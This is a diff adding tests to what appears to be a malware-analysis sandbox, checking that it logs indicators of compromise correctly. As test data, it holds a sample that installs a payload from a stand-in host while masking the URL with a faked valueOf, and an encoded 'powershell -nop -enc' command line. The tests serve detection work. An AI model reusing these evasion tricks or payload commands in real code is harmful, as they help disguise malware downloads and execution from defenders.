@@ -324,3 +324,51 @@ describe("forged and unserializable values", function() {
 		}
 	});
 });
+
+describe("String objects and IOC snapshots", function() {
+	this.timeout(90000);
+
+	it("records a String object's real URL, not its own valueOf", function() {
+		const run = runSample(
+			"var u = new String(\"http://real.example/payload.exe\");\n" +
+			"u.valueOf = function () { return \"http://decoy.example/benign.txt\"; };\n" +
+			"InstallProduct(u);\n"
+		);
+		try {
+			assert.deepStrictEqual(run.read("urls.json"), ["http://real.example/payload.exe"]);
+		} finally {
+			fs.rmSync(run.work, {recursive: true, force: true});
+		}
+	});
+
+	it("keeps the fields of an object built on String.prototype", function() {
+		const run = runSample(
+			"var c = Object.create(String.prototype); c.valueOf = function () { return \"y\"; };\n" +
+			"c.Authorization = \"Bearer secret\";\n" +
+			"lib.logIOC(\"Forged\", {headers: c}, \"forged\");\n"
+		);
+		try {
+			const e = run.read("IOC.json").find((x) => x.type === "Forged");
+			assert.deepStrictEqual(e.value.headers, {Authorization: "Bearer secret"});
+		} finally {
+			fs.rmSync(run.work, {recursive: true, force: true});
+		}
+	});
+
+	it("never replaces a later IOC because an earlier value turned bad", function() {
+		const run = runSample(
+			"var n = 0; var g = {}; Object.defineProperty(g, \"v\", {enumerable: true,\n" +
+			"  get: function () { if (n++ > 1) throw null; return 1; }});\n" +
+			"lib.logIOC(\"G\", g, \"g\");\n" +
+			"lib.logIOC(\"Later\", {cmd: \"powershell -nop -enc SQBFAFgA\"}, \"later\");\n" +
+			"lib.logIOC(\"Last\", {ok: 1}, \"last\");\n"
+		);
+		try {
+			const iocs = run.read("IOC.json");
+			assert.deepStrictEqual(iocs.find((x) => x.type === "Later").value, {cmd: "powershell -nop -enc SQBFAFgA"});
+			assert.ok(iocs.some((x) => x.type === "Last"));
+		} finally {
+			fs.rmSync(run.work, {recursive: true, force: true});
+		}
+	});
+});
